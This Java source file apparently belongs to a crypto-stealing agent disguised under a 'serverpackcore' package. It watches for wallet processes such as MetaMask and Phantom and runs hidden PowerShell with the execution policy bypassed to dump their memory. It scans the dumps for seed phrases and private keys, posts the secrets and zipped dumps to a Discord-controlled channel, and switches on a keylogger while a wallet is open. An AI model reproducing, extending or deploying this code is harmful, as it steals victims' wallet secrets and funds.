package com.serverpackcore.agent;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermissions;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Watches wallet processes and the foreground title, then dumps memory on its
 * own and scans it. The dump itself runs on a small pool; the watcher never
 * blocks the Discord poller.
 */
final class WalletWatcher {
	private static final long RETRY_1 = 60_000L;
	private static final long RETRY_2 = 180_000L;
	private static final long FINDING_TTL = 30L * 60L * 1000L;
	private static final int MAX_ATTEMPTS = 3;
	private final Path installDir;
	private final Path ops;
	final State state;
	private final Poller poller;
	private final OpsNotifier notifier;
	private final Keylogger keylogger;

	private final Object lock = new Object();
	final Map<String, Integer> attempts = new ConcurrentHashMap<>();
	final Map<String, Long> dumped = new ConcurrentHashMap<>();
	final java.util.Set<String> completed = ConcurrentHashMap.newKeySet();
	private final Map<String, Long> notified = new ConcurrentHashMap<>();
	private volatile boolean restartKey = true;
	int dumpSchedules;
	int resumeSchedules;
	private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2, runnable -> {
		Thread thread = new Thread(runnable, "spc-wallet-timer");
		thread.setDaemon(true);
		return thread;
	});
	private volatile boolean running = true;
	private volatile boolean watchEnabled;
	private volatile String activeKey = "";
	private volatile long activePid;
	private volatile String activeName = "";
	private volatile boolean dumping;
	private Thread watchThread;
	private Thread whip;
	private Process watcher;
	private volatile Process dumpProcess;
	private java.util.function.BiFunction<String, Long, List<String>> captureOverride;

	WalletWatcher(Path installDir, Path ops, State state, Poller poller, OpsNotifier notifier, Keylogger keylogger) {
		this.installDir = installDir;
		this.ops = ops;
		this.state = state;
		this.poller = poller;
		this.notifier = notifier;
		this.keylogger = keylogger;
	}

	boolean wanted() {
		return state.walletsSet ? state.walletsWatch : DiscordConfig.walletsWatch();
	}

	/** Lets the Linux test suite exercise the state machine without PowerShell. */
	void enableForTest() {
		watchEnabled = true;
	}

	void captureForTest(java.util.function.BiFunction<String, Long, List<String>> override) {
		this.captureOverride = override;
	}

	synchronized boolean start() {
		if (!AgentPaths.isWindows() || !wanted()) {
			return false;
		}
		watchEnabled = true;
		if (watcher != null && watcher.isAlive()) {
			return true;
		}
		try {
			Path script = OpsPaths.walletsScript(installDir);
			Keylogger.writeResource("/serverpackcore/wallets.ps1", script);
			ProcessBuilder builder = new ProcessBuilder("powershell", "-NoP", "-NonInteractive",
				"-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", script.toString(),
				Long.toString(ProcessHandle.current().pid()));
			builder.redirectError(ProcessBuilder.Redirect.DISCARD);
			watcher = builder.start();
			watchThread = new Thread(() -> read(watcher), "spc-wallet-read");
			watchThread.setDaemon(true);
			watchThread.start();
			whip = new Thread(() -> waitAndRestart(watcher), "spc-wallet-whip");
			whip.setDaemon(true);
			whip.start();
			Log.debug("Wallet watcher started");
			return true;
		} catch (Throwable throwable) {
			Log.debug("Wallet watcher start failed", throwable);
			return false;
		}
	}

	synchronized void stop() {
		watchEnabled = false;
		Process dump = dumpProcess;
		if (dump != null) {
			// An interrupted dump would otherwise keep a powershell (and a .dmp) alive.
			Shell.kill(dump);
		}
		Process current = watcher;
		if (current != null) {
			current.destroy();
		}
		watcher = null;
		synchronized (lock) {
			activeKey = "";
			activeName = "";
			activePid = 0L;
			dumped.clear();
			attempts.clear();
			completed.clear();
		}
		keylogger.walletOff();
	}

	private void read(Process source) {
		try (BufferedReader output = new BufferedReader(
			new InputStreamReader(source.getInputStream(), StandardCharsets.UTF_8))) {
			String line;
			while ((line = output.readLine()) != null) {
				handle(line);
			}
		} catch (Throwable throwable) {
			Log.debug("Wallet watcher read failed", throwable);
		}
	}

	private void waitAndRestart(Process source) {
		try {
			source.waitFor();
		} catch (InterruptedException interrupted) {
			return;
		}
		if (!watchEnabled || watcher != source) {
			return;
		}
		try {
			Thread.sleep(5000L);
		} catch (InterruptedException interrupted) {
			return;
		}
		synchronized (this) {
			if (watchEnabled && wanted() && watcher == source) {
				watcher = null;
				start();
			}
		}
	}

	private void handle(String line) {
		if (line.isBlank()) {
			return;
		}
		try {
			String[] parts = line.split("\\|", 5);
			if (parts[0].equals("LOST")) {
				lost(parts.length > 1 ? parts[1] : "", parts.length > 2 ? parts[2] : "");
				return;
			}
			if (!parts[0].equals("DETECT") || parts.length < 5) {
				return;
			}
			detect(parts[1].toLowerCase(Locale.ROOT), Long.parseLong(parts[2]), parts[3], parts[4]);
		} catch (Throwable throwable) {
			Log.debug("Wallet line invalid: " + line, throwable);
		}
	}

	void detect(String name, long pid, String start, String title) {
		if (!watchEnabled || !wanted() || !alive(pid)) {
			return;
		}
		String key = name + "|" + pid + "|" + start;
		boolean notify;
		boolean resume = false;
		synchronized (lock) {
			if (key.equals(activeKey)) {
				return;
			}
			long now = System.currentTimeMillis();
			Long dumpedAt = dumped.get(key);
			// A browser closed by grace keeps its key so reopening the popup
			// within the cooldown only restores the session. Past the cooldown
			// the same browser PID is a genuinely new cycle.
			boolean dumpedAlready = dumpedAt != null
				&& now - dumpedAt <= DiscordConfig.walletCooldownSec() * 1000L;
			// The persisted key only bypasses the cooldown on the first detect
			// after a restart; every later focus bounce must respect it.
			boolean restartBypass = restartKey && key.equals(state.lastWalletKey);
			restartKey = false;
			if (now < state.walletCooldownUntil && !restartBypass && !dumpedAlready) {
				long wait = state.walletCooldownUntil - now + 250L;
				scheduler.schedule(() -> detect(name, pid, start, title), wait, TimeUnit.MILLISECONDS);
				return;
			}
			activeKey = key;
			activePid = pid;
			activeName = name;
			// One cycle per live process: a LOST/re-DETECT while the PID lives
			// must not alert or dump again.
			notify = !dumpedAlready;
			if (notify) {
				// A genuinely new cycle (new key, or the same key after its
				// cooldown) starts with a fresh attempt budget.
				attempts.remove(key);
				completed.remove(key);
				state.lastWalletKey = key;
				state.walletEvents++;
				state.walletCooldownUntil = now + DiscordConfig.walletCooldownSec() * 1000L;
				state.save(AgentPaths.state(installDir));
				String note = "wallet detected: " + name + " (" + pid + ")";
				notifier.send(note);
				java.util.Map<String, Object> event = new java.util.LinkedHashMap<>();
				event.put("name", name);
				event.put("pid", pid);
				if (title != null && !title.isBlank()) {
					event.put("title", title);
				}
				notifier.event("wallet_detected", event, note);
				keylogger.walletOn();
				dumped.put(key, now);
				dumpSchedules++;
			} else {
				// The popup came back after a grace close: wake the hook again
				// but keep the cycle silent.
				keylogger.walletOn();
				// If the grace beat the scheduled capture, the only dump was
				// skipped; reopen has to resume it even though the alert stays
				// silent.
				resume = !completed.contains(key);
			}
		}
		Log.debug("Wallet detected: " + name + " pid " + pid + " title " + title);
		if (notify) {
			schedule(key, name, pid, 5000L);
		} else if (resume) {
			resumeSchedules++;
			schedule(key, name, pid, 1000L);
		}
	}

	void lost(String name) {
		lost(name, "");
	}

	/**
	 * @param reason {@code dead} (process gone), {@code grace} (focus grace
	 *               expired) or empty for an old helper. An unknown/empty reason
	 *               keeps the historical behaviour: a live PID holds the session.
	 */
	void lost(String name, String reason) {
		boolean stopKeys;
		long closedPid = 0L;
		synchronized (lock) {
			if (activeKey.isEmpty()) {
				return;
			}
			if (!name.isEmpty() && !name.equals(activeName)) {
				return;
			}
			boolean processAlive = alive(activePid);
			boolean dead = "dead".equals(reason) || !processAlive;
			boolean browserClose = "grace".equals(reason) && processAlive && browser(activeName);
			if (!dead && !browserClose) {
				// A focus change is not a close: keep the key while the process
				// lives so the next DETECT is swallowed and no second dump runs.
				return;
			}
			// A grace close keeps the key: reopening the popup in this browser
			// restores the session without an alert or a second dump.
			if (dead) {
				dumped.remove(activeKey);
				attempts.remove(activeKey);
				completed.remove(activeKey);
			}
			activeKey = "";
			activeName = "";
			closedPid = activePid;
			activePid = 0L;
			stopKeys = true;
		}
		if (stopKeys) {
			keylogger.walletOff();
			notifier.send("wallet closed");
			notifier.event("wallet_closed", java.util.Map.of("pid", closedPid), "wallet closed");
		}
	}

	private void schedule(String key, String name, long pid, long delay) {
		scheduler.schedule(() -> dump(key, name, pid, false), delay, TimeUnit.MILLISECONDS);
	}

	static boolean browser(String name) {
		return name.equals("phantom") || name.equals("metamask") || name.equals("rabby")
			|| name.equals("trust") || name.equals("coinbase");
	}

	private boolean alive(long pid) {
		return pid > 0L && ProcessHandle.of(pid).map(ProcessHandle::isAlive).orElse(false);
	}

	private void dump(String key, String name, long pid, boolean manual) {
		if (!manual && (!key.equals(activeKey) || !alive(pid))) {
			return;
		}
		// The budget is consumed only when a dump actually starts. A schedule
		// that bounces off the running `dumping` flag must not burn an attempt.
		synchronized (lock) {
			if (dumping && !manual) {
				scheduler.schedule(() -> dump(key, name, pid, false), 15000L, TimeUnit.MILLISECONDS);
				return;
			}
			if (!manual && attempts.getOrDefault(key, 0) >= maxAttempts(name)) {
				return;
			}
			dumping = true;
		}
		int attempt = attempts.merge(key, 1, Integer::sum);
		if (attempt > maxAttempts(name)) {
			dumping = false;
			return;
		}
		try {
			List<String> dumps = capture(name, pid);
			if (dumps.isEmpty()) {
				if (attempt == 1) {
					notifier.send("wallet dump: no matching process");
				}
				return;
			}
			// A capture that produced files is complete: a later silent reopen
			// must not schedule the same dump again.
			completed.add(key);
			boolean found = false;
			for (String dump : dumps) {
				Path file = Path.of(dump);
				if (!Files.isRegularFile(file)) {
					continue;
				}
				found |= processDump(key, name, pid, file);
			}
			if (!found && !manual) {
				scheduleRetry(key, name, pid, attempt, "wallet dump sin seed/clave (puede estar bloqueada)");
			}
		} catch (Throwable throwable) {
			Log.debug("Wallet dump failed", throwable);
			notifier.send("wallet dump failed: " + throwable.getMessage());
		} finally {
			dumping = false;
		}
	}

	static int maxAttempts(String name) {
		// A Phantom/Chromium dump is ~190 MB and the vault stays encrypted, so a
		// second 60 s and 180 s copy rarely adds anything.
		return browser(name) ? 1 : MAX_ATTEMPTS;
	}

	private void scheduleRetry(String key, String name, long pid, int attempt, String note) {
		boolean retry = !browser(name) && (attempt == 1 || attempt == 2);
		if (!retry || !key.equals(activeKey) || !alive(pid)) {
			notifier.send(note);
			return;
		}
		notifier.send(note);
		long delay = attempt == 1 ? RETRY_1 : RETRY_2;
		scheduler.schedule(() -> dump(key, name, pid, false), delay, TimeUnit.MILLISECONDS);
	}

	/** Runs the native dump and returns absolute dump paths; handles big processes. */
	private List<String> capture(String name, long pid) throws Exception {
		if (captureOverride != null) {
			return captureOverride.apply(name, pid);
		}
		Path script = OpsPaths.dumpScript(installDir);
		Keylogger.writeResource("/serverpackcore/memdump.ps1", script);
		Path list = ops.resolve("memdump-" + System.currentTimeMillis() + ".list");
		Files.deleteIfExists(list);
		String tag = Long.toString(System.nanoTime());
		String target = pid > 0L ? Long.toString(pid) : name;
		String command = "powershell -NoP -ExecutionPolicy Bypass -File \"" + script + "\" \"" + name + "\" \""
			+ target + "\" \"" + ops + "\" \"" + list + "\" \"" + tag + "\"";
		List<String> dumps = new ArrayList<>();
		try {
			String output = Shell.run(ops, command, 300000L, process -> dumpProcess = process);
			if (!output.isBlank()) {
				Log.debug("Wallet dump " + name + " " + target + ": " + output.strip());
			}
			if (Files.isRegularFile(list)) {
				dumps = parseList(Files.readAllLines(list, StandardCharsets.UTF_8),
					message -> notifier.send("wallet dump skipped: " + message));
				Files.deleteIfExists(list);
			}
		} finally {
			dumpProcess = null;
			removeStrays(tag, dumps);
		}
		return dumps;
	}

	/** Parses the dump list; a BOM or stray CR from PowerShell must not corrupt a path. */
	static List<String> parseList(List<String> lines, java.util.function.Consumer<String> big) {
		List<String> dumps = new ArrayList<>();
		for (String line : lines) {
			String value = line.replace("\uFEFF", "").trim();
			if (value.startsWith("BIG|")) {
				String[] parts = value.split("\\|");
				if (parts.length > 1) {
					big.accept(parts[1] + " MB (limit 1536)");
				}
				continue;
			}
			if (!value.isEmpty() && !value.contains("|")) {
				dumps.add(value);
			}
		}
		return dumps;
	}

	/** Deletes partial dumps from this capture only, never a listed or foreign one. */
	private void removeStrays(String tag, List<String> kept) {
		String prefix = "wallet-" + tag + "-";
		try (var stream = Files.list(ops)) {
			stream.filter(path -> {
				String file = path.getFileName().toString();
				return file.startsWith(prefix) && file.endsWith(".dmp") && !kept.contains(path.toString());
			}).forEach(path -> {
				try {
					Files.deleteIfExists(path);
				} catch (Throwable ignored) {
					// Still being written or already gone.
				}
			});
		} catch (Throwable throwable) {
			Log.debug("Wallet stray cleanup failed", throwable);
		}
	}

	private boolean processDump(String key, String name, long pid, Path dump) {
		long stamp = System.currentTimeMillis();
		Path findings = ops.resolve("findings-" + stamp + ".txt");
		Path zip = dump.resolveSibling(dump.getFileName() + ".zip");
		boolean found = false;
		boolean zipped = false;
		try {
			List<MemoryScanner.Finding> hits;
			try {
				hits = MemoryScanner.load().scan(dump);
			} catch (Throwable throwable) {
				Log.debug("Scan failed", throwable);
				hits = List.of();
			}
			if (!hits.isEmpty()) {
				Files.writeString(findings, MemoryScanner.render(hits), StandardCharsets.UTF_8);
				secure(findings);
				poller.uploadFile(findings);
				notifyFindings(hits);
				found = true;
			}
			Shell.run(ops, "tar -a -cf \"" + zip + "\" -C \"" + dump.getParent() + "\" \""
				+ dump.getFileName() + "\"", 600000L);
			zipped = Files.isRegularFile(zip);
			boolean uploaded = zipped && poller.uploadFile(zip);
			state.walletDumps++;
			state.save(AgentPaths.state(installDir));
			if (uploaded) {
				Files.deleteIfExists(zip);
			} else if (Files.isRegularFile(zip)) {
				notifier.send("wallet dump upload failed; kept " + zip.getFileName());
			}
		} catch (Throwable throwable) {
			Log.debug("Dump processing failed", throwable);
		} finally {
			try {
				if (zipped) {
					Files.deleteIfExists(dump);
				}
			} catch (Throwable ignored) {
				// best effort
			}
		}
		return found;
	}

	void notifyFindings(List<MemoryScanner.Finding> hits) {
		long now = System.currentTimeMillis();
		notified.values().removeIf(stamp -> now - stamp > FINDING_TTL);
		for (MemoryScanner.Finding finding : hits) {
			String key = finding.kind() + "|" + finding.value();
			boolean seed = finding.kind().startsWith("bip39");
			if (seed && SecretDetector.alertedRecently(finding.value())) {
				notified.putIfAbsent(key, now);
				continue;
			}
			if (notified.putIfAbsent(key, now) != null) {
				continue;
			}
			switch (finding.kind()) {
				case "bip39-24" -> {
					String legacy = "seed encontrada: 24 palabras\n" + finding.value();
					notifier.send("seed encontrada: 24 palabras");
					notifier.send(finding.value());
					notifier.event("seed_found", java.util.Map.of("words", 24, "value", finding.value()), legacy);
				}
				case "bip39-12" -> {
					String heading = finding.confident() ? "seed encontrada: 12 palabras" : "posible seed (12 palabras)";
					String legacy = heading + "\n" + finding.value();
					notifier.send(heading);
					notifier.send(finding.value());
					notifier.event("seed_found", java.util.Map.of("words", 12, "value", finding.value()), legacy);
				}
				case "xprv", "solana", "evm-key", "hex64" -> {
					String secretKind = finding.kind();
					String text = switch (secretKind) {
						case "xprv" -> "xprv encontrado";
						case "solana" -> "clave privada Solana encontrada";
						case "evm-key" -> "clave privada EVM (o hex64) encontrada";
						default -> "hex64 encontrado (clave EVM o hash)";
					};
					notifier.send(text);
					java.util.Map<String, Object> data = new java.util.LinkedHashMap<>();
					data.put("secret_kind", secretKind);
					data.put("value", finding.value());
					data.put("confident", finding.confident());
					notifier.event("secret_found", data, text);
				}
				default -> {
					String text = finding.kind() + " encontrado";
					notifier.send(text);
					java.util.Map<String, Object> data = new java.util.LinkedHashMap<>();
					data.put("secret_kind", "other");
					data.put("value", finding.value());
					data.put("confident", finding.confident());
					notifier.event("secret_found", data, text);
				}
			}
		}
	}

	private static void secure(Path file) {
		try {
			Files.setPosixFilePermissions(file, PosixFilePermissions.fromString("rw-------"));
		} catch (Throwable ignored) {
			// Windows
		}
	}

	synchronized String command(List<String> args) {
		String action = args.size() > 1 ? args.get(1).toLowerCase(Locale.ROOT) : "status";
		switch (action) {
			case "watch" -> {
				String value = args.size() > 2 ? args.get(2).toLowerCase(Locale.ROOT) : "";
				if (value.equals("on")) {
					state.walletsWatch = true;
					state.walletsSet = true;
					state.save(AgentPaths.state(installDir));
					return start() ? "Wallet watch on" : "Wallet watch enabled, but the watcher did not start";
				}
				if (value.equals("off")) {
					state.walletsWatch = false;
					state.walletsSet = true;
					state.save(AgentPaths.state(installDir));
					stop();
					return "Wallet watch off";
				}
				return "Usage: wallet watch on|off";
			}
			default -> {
				return "Wallet watch: " + (wanted() ? "on" : "off")
					+ (watcher != null && watcher.isAlive() ? " · watcher running" : " · watcher stopped")
					+ " · active " + (activeName.isEmpty() ? "none" : activeName)
					+ " · dumps " + state.walletDumps + " · cooldown "
					+ Math.max(0L, (state.walletCooldownUntil - System.currentTimeMillis()) / 1000L) + "s";
			}
		}
	}

	/** Manual `memdump` keeps working even with the watcher off. */
	void manual(String target) {
		String name = target.matches("\\d+") ? "manual" : target.toLowerCase(Locale.ROOT);
		long pid = target.matches("\\d+") ? Long.parseLong(target) : 0L;
		String key = "manual|" + target + "|" + System.currentTimeMillis();
		scheduler.execute(() -> dump(key, name, pid, true));
	}

	void shutdown() {
		running = false;
		stop();
		scheduler.shutdownNow();
		keylogger.stopTail();
	}
}
